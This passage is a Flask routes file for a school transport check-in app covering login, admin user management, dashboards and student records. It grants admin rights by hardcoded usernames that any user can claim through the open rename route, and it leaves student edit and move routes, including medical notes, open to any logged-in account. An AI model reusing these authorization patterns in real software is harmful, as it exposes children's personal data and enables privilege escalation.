# Added test user route to fix login
from flask import render_template, request, redirect, url_for, flash, jsonify, session, make_response, Response
from flask_login import login_user, logout_user, login_required, current_user
from urllib.parse import urlparse
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import InputRequired, Length
from functools import wraps
from app import app, db, csrf
from models import User
import database_store as data_store
import profanity_filter
import json
import time
import threading
import uuid
from collections import defaultdict
from datetime import datetime

# Global event store for real-time updates
event_clients = defaultdict(list)
event_lock = threading.Lock()

def is_safe_url(target):
    """Check if a URL is safe for redirects (same host/internal only)"""
    if not target:
        return False
    
    # Parse the target URL
    parsed = urlparse(target)
    
    # Allow only relative URLs (no netloc) or empty netloc
    # This prevents redirects to external sites
    if parsed.netloc:
        return False
    
    # Allow only safe schemes or no scheme (relative URLs)
    if parsed.scheme and parsed.scheme not in ['http', 'https', '']:
        return False
    
    return True

# Login Form
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[InputRequired(), Length(min=3, max=20)])
    password = PasswordField('Password', validators=[InputRequired(), Length(min=6, max=40)])
    submit = SubmitField('Sign In')



# Admin required decorator
def admin_required(f):
    """Decorator to require admin privileges for route access"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        print(f"DEBUG ADMIN_DECORATOR: Checking access for route {f.__name__}")
        print(f"DEBUG ADMIN_DECORATOR: User authenticated: {current_user.is_authenticated}")
        print(f"DEBUG ADMIN_DECORATOR: Current user: {current_user.username if current_user.is_authenticated else 'None'}")
        print(f"DEBUG ADMIN_DECORATOR: User ID: {current_user.id if current_user.is_authenticated else 'None'}")
        
        if not current_user.is_authenticated:
            print(f"DEBUG ADMIN_DECORATOR: User not authenticated, redirecting to login")
            return redirect(url_for('login'))
        
        # Check admin status - simplified approach
        is_admin = False
        try:
            # Direct username check first - most reliable
            if hasattr(current_user, 'username') and current_user.username in ['admin', 'gfokti', 'Gfokti']:
                is_admin = True
                print(f"DEBUG ADMIN_DECORATOR: Admin access granted for username: {current_user.username}")
            else:
                # Check staff account as secondary method
                try:
                    from models import StaffAccount
                    current_staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
                    print(f"DEBUG ADMIN_DECORATOR: StaffAccount found: {current_staff_account is not None}")
                    if current_staff_account and current_staff_account.account_type == 'admin':
                        is_admin = True
                        print(f"DEBUG ADMIN_DECORATOR: Admin via StaffAccount")
                except Exception as e:
                    print(f"DEBUG ADMIN_DECORATOR: Error checking StaffAccount: {e}")
        except Exception as e:
            print(f"DEBUG ADMIN_DECORATOR: Error in admin check: {e}")
            # Final fallback
            is_admin = hasattr(current_user, 'username') and current_user.username in ['admin', 'gfokti', 'Gfokti']
        
        print(f"DEBUG ADMIN_DECORATOR: Final admin status: {is_admin}")
        
        if not is_admin:
            print(f"DEBUG ADMIN_DECORATOR: Access denied for user {current_user.username}")
            flash('Access denied. Admin privileges required.', 'error')
            return redirect(url_for('index'))
        
        print(f"DEBUG ADMIN_DECORATOR: Access granted, calling route {f.__name__}")
        return f(*args, **kwargs)
    return decorated_function

# Make session permanent
@app.before_request
def make_session_permanent():
    session.permanent = True

# Authentication Routes
@app.route('/login', methods=['GET', 'POST'])
def login():
    """User login"""
    if current_user.is_authenticated:
        return redirect(url_for('routes'))
    
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        
        if user and user.check_password(form.password.data) and user.active:
            login_user(user)
            next_page = request.args.get('next')
            if next_page and is_safe_url(next_page):
                return redirect(next_page)
            else:
                # Check if user is admin and redirect accordingly
                is_admin = False
                try:
                    from models import StaffAccount
                    staff_account = StaffAccount.query.filter_by(user_id=user.id).first()
                    if user.username in ['admin', 'gfokti', 'Gfokti'] or (staff_account and staff_account.account_type == 'admin'):
                        is_admin = True
                except Exception as e:
                    if user.username in ['admin', 'gfokti', 'Gfokti']:
                        is_admin = True
                
                return redirect(url_for('routes'))
        else:
            flash('Invalid username or password')
    
    return render_template('auth/login.html', form=form)



@app.route('/logout')
@login_required
def logout():
    """User logout"""
    logout_user()
    flash('You have been logged out')
    return redirect(url_for('login'))

@app.route('/profile')
@login_required
def profile():
    """User profile page"""
    return render_template('profile.html')

@app.route('/profile/change-username', methods=['POST'])
@login_required
def change_username():
    """Change user's username"""
    new_username = request.form.get('new_username')
    
    if not new_username:
        flash('Username cannot be empty', 'error')
        return redirect(url_for('profile'))
    
    # Check if username already exists
    existing_user = User.query.filter_by(username=new_username).first()
    if existing_user and existing_user.id != current_user.id:
        flash('Username already exists! Please choose a different username.', 'error')
        return redirect(url_for('profile'))
    
    try:
        current_user.username = new_username
        db.session.commit()
        flash('Username updated successfully!', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Error updating username: {str(e)}', 'error')
    
    return redirect(url_for('profile'))

@app.route('/profile/change-password', methods=['POST'])
@login_required
def change_password():
    """Change user's password"""
    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')
    confirm_password = request.form.get('confirm_password')
    
    if not current_password or not new_password or not confirm_password:
        flash('All password fields are required', 'error')
        return redirect(url_for('profile'))
    
    if not current_user.check_password(current_password):
        flash('Current password is incorrect', 'error')
        return redirect(url_for('profile'))
    
    if new_password != confirm_password:
        flash('New passwords do not match', 'error')
        return redirect(url_for('profile'))
    
    if len(new_password) < 6:
        flash('New password must be at least 6 characters long', 'error')
        return redirect(url_for('profile'))
    
    try:
        current_user.set_password(new_password)
        db.session.commit()
        flash('Password updated successfully!', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Error updating password: {str(e)}', 'error')
    
    return redirect(url_for('profile'))

@app.route('/admin/user/<int:user_id>/change-password', methods=['POST'])
@admin_required
def admin_change_user_password(user_id):
    """Admin change another user's password"""
    # Temporarily allow all logged-in users
    print(f"DEBUG: Admin password change by {current_user.username} for user {user_id}")
    
    target_user = User.query.get(user_id)
    if not target_user:
        flash('User not found', 'error')
        return redirect(url_for('staff'))
    
    new_password = request.form.get('new_password')
    if not new_password or len(new_password) < 6:
        flash('Password must be at least 6 characters long', 'error')
        return redirect(url_for('staff'))
    
    try:
        target_user.set_password(new_password)
        db.session.commit()
        flash(f'Password updated for {target_user.username}', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Error updating password: {str(e)}', 'error')
    
    return redirect(url_for('staff'))

@app.route('/admin/user/<int:user_id>/change-username', methods=['POST'])
@admin_required
def admin_change_user_username(user_id):
    """Admin change another user's username"""
    # Temporarily allow all logged-in users  
    print(f"DEBUG: Admin username change by {current_user.username} for user {user_id}")
    
    target_user = User.query.get(user_id)
    if not target_user:
        flash('User not found', 'error')
        return redirect(url_for('staff'))
    
    new_username = request.form.get('new_username')
    if not new_username:
        flash('Username cannot be empty', 'error')
        return redirect(url_for('staff'))
    
    # Check if username already exists
    existing_user = User.query.filter_by(username=new_username).first()
    if existing_user and existing_user.id != user_id:
        flash('Username already exists! Please choose a different username.', 'error')
        return redirect(url_for('staff'))
    
    try:
        old_username = target_user.username
        target_user.username = new_username
        db.session.commit()
        flash(f'Username updated from {old_username} to {new_username}', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Error updating username: {str(e)}', 'error')
    
    return redirect(url_for('staff'))

@app.route('/')
def index():
    """Landing page - redirect based on account type or to login"""
    if current_user.is_authenticated:
        # Check account type and redirect accordingly
        try:
            from models import StaffAccount
            staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
            
            # Check if class account
            if staff_account and staff_account.account_type == 'class':
                return redirect(url_for('dashboard'))
            
            # Check if admin account
            is_admin = False
            if current_user.username in ['admin', 'gfokti', 'Gfokti'] or (staff_account and staff_account.account_type == 'admin'):
                is_admin = True
            
            # Admin accounts go to routes (Transport Check-in)
            if is_admin:
                return redirect(url_for('routes'))
            
            # Fallback for other users
            return redirect(url_for('routes'))
            
        except Exception as e:
            # Fallback check for admin username
            if current_user.username in ['admin', 'gfokti', 'Gfokti']:
                return redirect(url_for('routes'))
            return redirect(url_for('dashboard'))
        
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    """Main dashboard - for class accounts only. Admin accounts are redirected to Transport Check-in."""
    # Check if this is an admin account and redirect them
    try:
        from models import StaffAccount
        staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
        
        # Check if user is admin (either via username or staff account)
        is_admin = False
        if hasattr(current_user, 'username') and current_user.username in ['admin', 'gfokti', 'Gfokti']:
            is_admin = True
        elif staff_account and staff_account.account_type == 'admin':
            is_admin = True
            
        if is_admin:
            flash('Admin accounts should use Transport Check-in for route management.', 'info')
            return redirect(url_for('routes'))
            
    except Exception as e:
        print(f"Error checking admin status: {e}")
        # Fallback check for admin username
        if hasattr(current_user, 'username') and current_user.username in ['admin', 'gfokti', 'Gfokti']:
            flash('Admin accounts should use Transport Check-in for route management.', 'info')
            return redirect(url_for('routes'))
    
    # Check if this is a class account
    is_class_account = False
    assigned_classes = []
    selected_class = None
    
    try:
        from models import StaffAccount, StaffClassAssignment
        staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
        
        if staff_account and staff_account.account_type == 'class':
            is_class_account = True
            # Get assigned classes for this staff member
            assignments = StaffClassAssignment.query.filter_by(staff_account_id=staff_account.id).all()
            assigned_classes = [a.class_name for a in assignments]
            
            # Auto-select class if user has only one class, or use first assigned class if none selected
            if len(assigned_classes) == 1:
                selected_class = assigned_classes[0]
            else:
                # Check if class is specified in query params
                selected_class = request.args.get('class')
                if not selected_class and len(assigned_classes) > 0:
                    # Default to first assigned class if none selected
                    selected_class = assigned_classes[0]
                elif selected_class and selected_class not in assigned_classes:
                    selected_class = None
        else:
            # If user is not a class account and not admin, they shouldn't access dashboard
            flash('Access denied. This page is only available for class accounts.', 'error')
            return redirect(url_for('routes'))
    except Exception as e:
        print(f"Error checking staff account: {e}")
    
    # Get base data
    schools = data_store.get_all_schools()
    routes = data_store.get_all_routes()
    students = data_store.get_all_students()
    
    # Filter data based on account type and selected class
    if is_class_account and selected_class:
        # For class accounts, filter to show only routes with students from the selected class
        class_students = {sid: student for sid, student in students.items() 
                         if student.get('class_name') == selected_class}
        
        # Get routes that have students from the selected class
        class_route_ids = set()
        for student in class_students.values():
            route_id = student.get('route_id')
            if route_id and route_id in routes:
                class_route_ids.add(route_id)
        
        filtered_routes = {rid: routes[rid] for rid in class_route_ids}
        filtered_students = class_students
    else:
        # Admin view or no class selected - show all data
        filtered_students = students
        filtered_routes = routes
    
    # Calculate statistics based on filtered data
    total_routes = len(filtered_routes)
    total_students = len(filtered_students)
    total_staff = len(data_store.get_all_staff())
    
    # Calculate route status counts and get route lists by status
    ready_routes_list = []
    arrived_routes_list = []
    not_ready_routes_list = []
    
    for route_id, route in filtered_routes.items():
        # Count students in this route
        route_student_count = len(route.get('student_ids', []))
        
        enriched_route = {
            'id': route_id,
            'route_number': route['route_number'],
            'provider_name': route.get('provider_name', 'Unknown Provider'),
            'area_name': route.get('area_name', 'Unknown Area'),
            'status': route['status'],
            'student_count': route_student_count
        }
        
        if route['status'] == data_store.BUS_STATUS_READY:
            ready_routes_list.append(enriched_route)
        elif route['status'] == data_store.BUS_STATUS_ARRIVED:
            arrived_routes_list.append(enriched_route)
        elif route['status'] == data_store.BUS_STATUS_NOT_PRESENT:
            not_ready_routes_list.append(enriched_route)
    
    # Get class names for dropdown - class accounts see only assigned classes
    if is_class_account:
        class_names = assigned_classes  # Only show assigned classes
    else:
        class_names = data_store.get_unique_class_names()  # Show all classes for admin
    
    return render_template('dashboard.html', 
                         schools=schools,
                         class_names=class_names,
                         routes=filtered_routes,
                         total_schools=len(schools),
                         total_routes=total_routes,
                         ready_routes=len(ready_routes_list),
                         arrived_routes=len(arrived_routes_list),
                         not_arrived_routes=len(not_ready_routes_list),
                         ready_routes_list=ready_routes_list,
                         arrived_routes_list=arrived_routes_list,
                         not_arrived_routes_list=not_ready_routes_list,
                         total_staff=total_staff,
                         total_students=total_students,
                         is_class_account=is_class_account,
                         assigned_classes=assigned_classes,
                         selected_class=selected_class)

@app.route('/api/dashboard-stats')
@login_required  
def dashboard_stats():
    """API endpoint for dashboard statistics - class-specific for class accounts"""
    # Check if this is a class account
    is_class_account = False
    selected_class = request.args.get('class')
    assigned_classes = []
    
    print(f"DEBUG DASHBOARD_STATS: User {current_user.username} (ID: {current_user.id})")
    print(f"DEBUG DASHBOARD_STATS: Selected class from request: {selected_class}")
    
    try:
        from models import StaffAccount, StaffClassAssignment
        staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
        
        if staff_account:
            print(f"DEBUG DASHBOARD_STATS: Staff account found, type: {staff_account.account_type}")
            if staff_account.account_type == 'class':
                is_class_account = True
                # Get assigned classes for this staff member
                assignments = StaffClassAssignment.query.filter_by(staff_account_id=staff_account.id).all()
                assigned_classes = [a.class_name for a in assignments]
                print(f"DEBUG DASHBOARD_STATS: Assigned classes: {assigned_classes}")
                
                # Auto-select class if user has only one class, or use first assigned class if none selected
                if len(assigned_classes) == 1:
                    selected_class = assigned_classes[0]
                    print(f"DEBUG DASHBOARD_STATS: Auto-selected single class: {selected_class}")
                elif not selected_class and len(assigned_classes) > 0:
                    # For class accounts with multiple classes, default to first class if none selected
                    selected_class = assigned_classes[0]
                    print(f"DEBUG DASHBOARD_STATS: Auto-selected first class: {selected_class}")
                elif selected_class and selected_class not in assigned_classes:
                    print(f"DEBUG DASHBOARD_STATS: Selected class {selected_class} not in assigned classes, clearing")
                    selected_class = None
        else:
            print(f"DEBUG DASHBOARD_STATS: No staff account found")
    except Exception as e:
        print(f"Error checking staff account: {e}")
    
    print(f"DEBUG DASHBOARD_STATS: Final - is_class_account: {is_class_account}, selected_class: {selected_class}")
    
    # Get base data
    schools = data_store.get_all_schools()
    routes = data_store.get_all_routes()
    students = data_store.get_all_students()
    
    # Filter data based on selected class for both admin and class accounts
    if selected_class:
        if is_class_account:
            print(f"DEBUG DASHBOARD_STATS: Filtering for class account with class {selected_class}")
        else:
            print(f"DEBUG DASHBOARD_STATS: Filtering for admin account with selected class {selected_class}")
        
        # Filter to show only routes with students from the selected class
        class_students = {sid: student for sid, student in students.items() 
                         if student.get('class_name') == selected_class}
        print(f"DEBUG DASHBOARD_STATS: Found {len(class_students)} students in class {selected_class}")
        
        # Get routes that have students from the selected class, applying same filtering as Transport Check-in
        areas = data_store.get_all_areas()
        class_route_ids = set()
        filtered_class_students = {}
        
        for student_id, student in class_students.items():
            route_id = student.get('route_id')
            if route_id and route_id in routes:
                route = routes[route_id]
                # Apply same filtering as Transport Check-in: exclude routes in "Multiple areas"
                area_id = route.get('area_id')
                if area_id and area_id in areas:
                    area = areas[area_id]
                    if area.get('name') == 'Multiple areas':
                        continue  # Skip routes in "Multiple areas"
                
                class_route_ids.add(route_id)
                filtered_class_students[student_id] = student
        filtered_routes = {rid: routes[rid] for rid in class_route_ids}
        filtered_students = filtered_class_students
    else:
        print(f"DEBUG DASHBOARD_STATS: Showing all data (admin view or no class selected)")
        # Admin view or no class selected - show all data
        filtered_routes = routes
        filtered_students = students
    
    total_routes = len(filtered_routes)
    total_students = len(filtered_students)
    total_staff = len(data_store.get_all_staff())
    
    # Calculate route status counts
    ready_routes = 0
    arrived_routes = 0
    not_ready_routes = 0
    
    for route_id, route in filtered_routes.items():
        if route['status'] == data_store.BUS_STATUS_READY:
            ready_routes += 1
        elif route['status'] == data_store.BUS_STATUS_ARRIVED:
            arrived_routes += 1
        elif route['status'] == data_store.BUS_STATUS_NOT_PRESENT:
            not_ready_routes += 1
    
    return jsonify({
        'total_schools': len(schools),
        'total_buses': total_routes,
        'ready_buses': ready_routes,
        'arrived_buses': arrived_routes, 
        'not_ready_buses': not_ready_routes,
        'total_staff': total_staff,
        'total_students': total_students
    })

@app.route('/api/class-checkin/<class_name>')
@login_required
def get_class_checkin_data(class_name):
    """Get check-in data for students in a specific class, grouped by transport route"""
    students = data_store.get_all_students()
    routes = data_store.get_all_routes()
    areas = data_store.get_all_areas()
    
    # Group students by route
    route_groups = {}
    no_route_students = []
    
    # Filter students by class and group by route
    for student_id, student in students.items():
        if student.get('class_name') == class_name:
            route_id = student.get('route_id')
            
            if route_id and route_id in routes:
                # Student has a route assignment
                route = routes[route_id]
                
                # Check if route should be filtered out to match Transport Check-in logic
                # The Transport Check-in page excludes routes in "Multiple areas"
                area_id = route.get('area_id')
                areas = data_store.get_all_areas()
                if area_id and area_id in areas:
                    area = areas[area_id]
                    if area.get('name') == 'Multiple areas':
                        continue  # Skip routes in "Multiple areas" to match Transport Check-in filtering
                
                route_key = route_id
                
                if route_key not in route_groups:
                    # Get area name
                    area = areas.get(route.get('area_id'))
                    area_name = area['name'] if area else 'Unknown Area'
                    
                    # Determine check-in status based on route status
                    if route['status'] == data_store.BUS_STATUS_READY:
                        checkin_status = 'Ready'
                    else:  # 'not_present' or 'arrived'
                        checkin_status = 'Not Ready'
                    
                    route_groups[route_key] = {
                        'route_number': route['route_number'],
                        'area': area_name,
                        'checkin_status': checkin_status,
                        'students': []
                    }
                
                route_groups[route_key]['students'].append({
                    'student_id': student_id,
                    'name': student['name']
                })
            else:
                # Student has no route assignment
                no_route_students.append({
                    'student_id': student_id,
                    'name': student['name']
                })
    
    # Sort students within each route group by name
    for group in route_groups.values():
        group['students'].sort(key=lambda x: x['name'])
    
    # Sort no-route students by name
    no_route_students.sort(key=lambda x: x['name'])
    
    # Convert to list format and sort by route number
    transport_groups = list(route_groups.values())
    transport_groups.sort(key=lambda x: x['route_number'])
    
    # Add no-route group if there are students without routes
    if no_route_students:
        transport_groups.append({
            'route_number': 'No Route',
            'area': 'No Transport',
            'checkin_status': 'Not Ready',
            'students': no_route_students
        })
    
    # Calculate totals
    total_students = sum(len(group['students']) for group in transport_groups)
    ready_students = sum(len(group['students']) for group in transport_groups if group['checkin_status'] == 'Ready')
    not_ready_students = total_students - ready_students
    
    # Add detailed logging for Ext 1 specifically
    if class_name == 'Ext 1':
        print(f"EXT1 DEBUG: Returning {len(transport_groups)} route groups")
        for group in transport_groups:
            print(f"EXT1 DEBUG: Route '{group['route_number']}' ({group['area']}) - {group['checkin_status']} - {len(group['students'])} students")
            for student in group['students']:
                print(f"EXT1 DEBUG:   - {student['name']}")
        if no_route_students:
            print(f"EXT1 DEBUG: {len(no_route_students)} students without routes")
            for student in no_route_students:
                print(f"EXT1 DEBUG:   - {student['name']}")
    
    return jsonify({
        'success': True,
        'transport_groups': transport_groups,
        'class_name': class_name,
        'total_students': total_students,
        'ready_students': ready_students,
        'not_ready_students': not_ready_students
    })



@app.route('/schools')
@login_required
def schools():
    """Route Admin page - comprehensive route management"""
    # Class accounts should not have access to Route Admin - redirect silently
    try:
        from models import StaffAccount
        staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
        if staff_account and staff_account.account_type == 'class':
            return redirect(url_for('dashboard'))
    except Exception as e:
        print(f"Error checking staff account: {e}")
    search_query = request.args.get('search', '')
    
    # Get all routes with detailed information
    routes = data_store.get_all_routes()
    providers = data_store.get_all_providers()
    areas = data_store.get_all_areas()
    students = data_store.get_all_students()
    
    # Enrich routes with additional information, filtering out admin-hidden routes
    enriched_routes = {}
    for route_id, route in routes.items():
        # Skip routes marked as hidden from admin (individual parent routes)
        if route.get('hidden_from_admin', False):
            continue
            
        enriched_route = route.copy()
        
        # Use existing provider and area info from route data, or look up by ID
        # Try to get provider_name from route data first, then look up by provider_id
        if route.get('provider_name'):
            enriched_route['provider_name'] = route.get('provider_name')
        elif route.get('provider_id'):
            provider = data_store.get_provider(route.get('provider_id'))
            if provider:
                enriched_route['provider_name'] = provider['name']
                # Store it for future use
                route['provider_name'] = provider['name']
                data_store.save_data_to_file()  # Persist the update
            else:
                enriched_route['provider_name'] = 'Unknown Provider'
        else:
            enriched_route['provider_name'] = 'Unknown Provider'
        
        # Try to get area_name from route data first, then look up by area_id
        if route.get('area_name'):
            enriched_route['area_name'] = route.get('area_name')
        elif route.get('area_id'):
            area = data_store.get_area(route.get('area_id'))
            if area:
                enriched_route['area_name'] = area['name']
                # Store it for future use
                route['area_name'] = area['name']
                data_store.save_data_to_file()  # Persist the update
        elif route['route_number'] == 'Parent':
            # Parent route has no single area - it has multiple pickup areas
            enriched_route['area_name'] = None  # Will be handled by template
        else:
            enriched_route['area_name'] = 'Unknown Area'
        
        # Get students count - for Parent routes, include all students from individual parent routes
        if route['route_number'] == 'Parent':
            # For Parent route, count students from ALL individual parent routes with same provider
            route_students = []
            provider_id = route['provider_id']
            
            # Get students assigned to individual parent routes with this provider using route_id system
            for route_check_id, route_check in routes.items():
                route_name = route_check.get('route_number', '')
                if (route_name.endswith("'s Parent") and 
                    route_check.get('provider_id') == provider_id):
                    # Add students assigned to this individual parent route
                    for student in students.values():
                        if student.get('route_id') == route_check_id:
                            route_students.append(student)
        else:
            # For regular routes, count students where route_id matches
            route_students = [s for s in students.values() if s.get('route_id') == route_id]
        enriched_route['students_count'] = len(route_students)
        
        # Debug logging for count mismatch issues
        if len(route_students) > 0 or route['route_number'] == 'E1':
            student_names = [s.get('name', 'Unknown') for s in route_students]
            print(f"DEBUG: Route {route['route_number']} (ID: {route_id}) has {len(route_students)} students: {student_names}")
            
            # For E1 specifically, show all students that might match
            if route['route_number'] == 'E1':
                print(f"DEBUG: E1 route_id in system: {route_id}")
                all_students_for_debug = [f"{s.get('name', 'Unknown')} (route_id: {s.get('route_id', 'None')})" 
                                        for s in students.values() if s.get('route_id') == route_id]
                print(f"DEBUG: All students with matching route_id {route_id}: {all_students_for_debug}")
        
        enriched_routes[route_id] = enriched_route
    
    # Search filtering
    if search_query:
        filtered_routes = {}
        for route_id, route in enriched_routes.items():
            if (search_query.lower() in route['route_number'].lower() or 
                search_query.lower() in route['provider_name'].lower() or
                search_query.lower() in route['area_name'].lower()):
                filtered_routes[route_id] = route
        enriched_routes = filtered_routes
    
    # Sort routes alphabetically by route number
    enriched_routes = dict(sorted(enriched_routes.items(), key=lambda x: x[1]['route_number'].lower()))
    
    return render_template('schools.html', 
                         routes=enriched_routes, 
                         providers=providers,
                         areas=areas,
                         search_query=search_query)

@app.route('/route/<route_id>/students')
@login_required
def route_students(route_id):
    """Display students for a specific route"""
    route = data_store.get_route(route_id)
    if not route:
        flash('Route not found', 'error')
        return redirect(url_for('schools'))
    
    # Get the 'from' parameter to determine where user came from
    came_from = request.args.get('from', 'schools')  # Default to schools (Route Admin)
    
    # Get all students assigned to this route
    all_students = data_store.get_all_students()
    all_routes = data_store.get_all_routes()
    route_students = []
    all_students_list = []
    
    # For Parent route, get students from individual parent routes OR from the route itself
    if route['route_number'] == 'Parent':
        provider_id = route['provider_id']
        
        # Always get students who are assigned to individual parent routes with this provider
        for route_check_id, route_check in all_routes.items():
            route_name = route_check.get('route_number', '')
            # Look for individual parent routes with same provider (both old and new format)
            if (route_name.endswith("'s Parent") and 
                route_check.get('provider_id') == provider_id):
                # Add all students assigned to individual parent routes
                for student_id, student in all_students.items():
                    if student.get('route_id') == route_check_id:
                        student_copy = student.copy()
                        # Add pickup area info from the individual route
                        student_copy['pickup_area_id'] = route_check.get('area_id')
                        route_students.append(student_copy)
    else:
        # For regular routes, get students where route_id matches
        for student_id, student in all_students.items():
            if student.get('route_id') == route_id:
                route_students.append(student)
    
    # Build all_students_list for the "Add Students" modal (for all route types)
    for student_id, student in all_students.items():
        student_copy = student.copy()
        if student.get('route_id') and student.get('route_id') in all_routes:
            student_copy['route_name'] = all_routes[student.get('route_id')]['route_number']
        all_students_list.append(student_copy)
    
    # Debug logging for route students page
    student_names = [s.get('name', 'Unknown') for s in route_students]
    print(f"DEBUG: Route students page - Route {route['route_number']} shows {len(route_students)} students: {student_names}")
    
    # Sort students by name alphabetically
    route_students.sort(key=lambda s: s['name'].lower())
    all_students_list.sort(key=lambda s: s['name'].lower())
    
    # Get provider and area info
    provider = data_store.get_provider(route['provider_id'])
    area = data_store.get_area(route['area_id'])
    
    # Add provider_name to route for JavaScript access
    route['provider_name'] = provider['name'] if provider else 'Unknown Provider'
    
    # For Parent routes, add pickup area information to each student
    if route['route_number'] == 'Parent':
        for student in route_students:
            # Find the individual route for this student to get their pickup area
            # Use full name to avoid collisions when students have same first name
            child_route_number = f"{student['name']}'s Parent"
            
            # Look for the individual route
            for route_id_check, route_check in all_routes.items():
                if (route_check['route_number'] == child_route_number and 
                    route_check['provider_id'] == route['provider_id']):
                    student['pickup_area_id'] = route_check.get('area_id')
                    break
            else:
                student['pickup_area_id'] = None
    
    # Get all areas for the dropdown
    all_areas = data_store.get_all_areas()
    
    return render_template('route_students.html', 
                         route=route,
                         students=route_students,
                         all_students=all_students_list,
                         provider=provider,
                         area=area,
                         areas=all_areas,
                         came_from=came_from,
                         all_routes=all_routes)

@app.route('/routes/<route_id>/remove-student', methods=['POST'])
@login_required
def remove_student_from_route_admin(route_id):
    """Remove a student from a route in Route Admin"""
    route = data_store.get_route(route_id)
    if not route:
        flash('Route not found!', 'error')
        return redirect(url_for('schools'))
    
    student_id = request.form.get('student_id')
    student = data_store.get_student(student_id)
    
    if not student:
        flash('Student not found!', 'error')
        return redirect(url_for('route_students', route_id=route_id))
    
    # Remove student from route
    success = data_store.remove_student_from_route(student_id)
    
    if success:
        flash(f'Student "{student["name"]}" removed from Route {route["route_number"]} successfully!', 'success')
    else:
        flash('Error removing student from route!', 'error')
    
    return redirect(url_for('route_students', route_id=route_id))

@app.route('/routes/<route_id>/move-student', methods=['POST'])
@login_required
def move_student_to_route(route_id):
    """Move a student from current route to another route"""
    current_route = data_store.get_route(route_id)
    if not current_route:
        flash('Current route not found!', 'error')
        return redirect(url_for('schools'))
    
    student_id = request.form.get('student_id')
    new_route_id = request.form.get('new_route_id')
    
    student = data_store.get_student(student_id)
    new_route = data_store.get_route(new_route_id)
    
    if not student:
        flash('Student not found!', 'error')
        return redirect(url_for('route_students', route_id=route_id))
    
    if not new_route:
        flash('Destination route not found!', 'error')
        return redirect(url_for('route_students', route_id=route_id))
    
    # Move student to new route (this automatically removes from old route)
    success = data_store.assign_student_to_route(student_id, new_route_id)
    
    if success:
        flash(f'Student "{student["name"]}" moved from Route {current_route["route_number"]} to Route {new_route["route_number"]} successfully!', 'success')
    else:
        flash('Error moving student to new route!', 'error')
    
    return redirect(url_for('route_students', route_id=route_id))

@app.route('/student/<student_id>/edit', methods=['POST'])
@login_required
def edit_student_ajax(student_id):
    """Edit a student's information"""
    try:
        student = data_store.get_student(student_id)
        if not student:
            return jsonify({'success': False, 'error': 'Student not found'})
        
        # Get form data
        name = request.form.get('name', '').strip()
        grade = request.form.get('grade', '').strip()
        class_name = request.form.get('class_name', '').strip()
        parent_name = request.form.get('parent_name', '').strip()
        parent_phone = request.form.get('parent_phone', '').strip()
        address = request.form.get('address', '').strip()
        has_medical_needs = request.form.get('has_medical_needs') == 'on'
        requires_pediatric_first_aid = request.form.get('requires_pediatric_first_aid') == 'on'
        medical_notes = request.form.get('medical_notes', '').strip()
        
        # Validate required fields
        if not name:
            return jsonify({'success': False, 'error': 'Student name is required'})
        
        # Validate text inputs for profanity
        text_fields = [
            (name, "student name"),
            (class_name, "class name"),
            (parent_name, "parent name"),
            (address, "address"),
            (medical_notes, "medical notes") if medical_notes else (None, None)
        ]
        
        for text, field_name in text_fields:
            if text and field_name:
                is_valid, error_msg = profanity_filter.validate_educational_content(text, field_name)
                if not is_valid:
                    return jsonify({'success': False, 'error': error_msg})
        
        # Also check safeguarding notes if present
        safeguarding_notes = request.form.get('safeguarding_notes', '').strip()
        if safeguarding_notes:
            is_valid, error_msg = profanity_filter.validate_educational_content(safeguarding_notes, "safeguarding notes")
            if not is_valid:
                return jsonify({'success': False, 'error': error_msg})
        
        # Update student
        updated_student = data_store.update_student(student_id,
            name=name,
            grade=grade,
            class_name=class_name,
            parent1_name=parent_name,
            parent1_phone=parent_phone,
            address=address,
            medical_needs=has_medical_needs,
            badge_required=requires_pediatric_first_aid,
            medical_notes=medical_notes,
            safeguarding_notes=safeguarding_notes
        )
        
        return jsonify({'success': True, 'student': updated_student})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/schools/add', methods=['GET', 'POST'])
@login_required
def add_school():
    """Add a new school"""
    if request.method == 'POST':
        name = request.form.get('name', '').strip()
        address = request.form.get('address', '').strip()
        contact1_name = request.form.get('contact1_name', '').strip()
        contact1_role = request.form.get('contact1_role', '').strip()
        contact1_email = request.form.get('contact1_email', '').strip()
        contact1_phone = request.form.get('contact1_phone', '').strip()
        contact2_name = request.form.get('contact2_name', '').strip()
        contact2_role = request.form.get('contact2_role', '').strip()
        contact2_email = request.form.get('contact2_email', '').strip()
        contact2_phone = request.form.get('contact2_phone', '').strip()
        
        # Validate text inputs for profanity
        text_fields = [
            (name, "school name"),
            (address, "school address"),
            (contact1_name, "primary contact name"),
            (contact1_role, "primary contact role"),
        ]
        
        # Include optional fields if they have content
        if contact2_name:
            text_fields.append((contact2_name, "secondary contact name"))
        if contact2_role:
            text_fields.append((contact2_role, "secondary contact role"))
        
        for text, field_name in text_fields:
            if text:
                is_valid, error_msg = profanity_filter.validate_educational_content(text, field_name)
                if not is_valid:
                    flash(error_msg, 'error')
                    return redirect(url_for('schools'))
        
        if name and address and contact1_name and contact1_role and contact1_email and contact1_phone:
            school = data_store.create_school(name, address, contact1_name, contact1_role, contact1_email, contact1_phone,
                                            contact2_name, contact2_role, contact2_email, contact2_phone)
            flash(f'School "{name}" added successfully!', 'success')
            return redirect(url_for('schools'))
        else:
            flash('All primary contact fields are required!', 'error')
    
    return render_template('schools.html', schools=data_store.get_all_schools(), show_add_form=True)

@app.route('/schools/<school_id>/edit', methods=['GET', 'POST'])
@login_required
def edit_school(school_id):
    """Edit an existing school"""
    school = data_store.get_school(school_id)
    if not school:
        flash('School not found!', 'error')
        return redirect(url_for('schools'))
    
